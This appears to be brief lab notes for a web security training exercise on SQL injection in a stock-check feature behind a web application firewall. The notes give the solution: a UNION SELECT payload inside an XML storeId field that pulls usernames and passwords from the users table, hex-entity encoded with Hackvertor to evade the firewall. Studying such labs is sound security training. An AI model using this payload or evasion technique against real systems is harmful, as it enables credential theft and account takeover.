 This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.

The database contains a users table, which contains the usernames and passwords of registered users. To solve the lab, perform a SQL injection attack to retrieve the admin user's credentials, then log in to their account. 

Hint: 
A web application firewall (WAF) will block requests that contain obvious signs of a SQL injection attack. You'll need to find a way to obfuscate your malicious query to bypass this filter. 
We recommend using the Hackvertor extension to do this. 

End Goal:
- Exploit SQLi to retrieve the admin user's credentials from the users table
- Log into their account

Analysis:
---------

* Install Hackvertor extention

<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>

encode with hex entities to bypass WAF
